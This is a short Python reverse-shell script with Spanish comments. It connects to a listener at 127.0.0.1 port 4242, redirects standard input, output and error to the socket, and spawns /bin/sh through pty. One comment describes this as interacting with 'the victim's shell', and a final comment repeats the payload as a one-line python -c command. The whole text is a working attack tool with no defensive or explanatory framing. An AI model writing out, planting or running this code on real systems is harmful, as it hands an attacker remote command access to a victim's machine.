
import socket#Conexion servidor - cliente
import os#Interactuar con el sistema operativo
import pty#Crear y manejar pseudoterminales

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("127.0.0.1",4242))

os.dup2(s.fileno(),0)#stdin
os.dup2(s.fileno(),1)#stdout
os.dup2(s.fileno(),2)#sderr

#Lanza el shell que nos permite interactuar como si fuera la shell de la víctima
pty.spawn("/bin/sh")


#python -c "import socket; import os; import pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('127.0.0.1', 4242)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); pty.spawn('/bin/sh')"

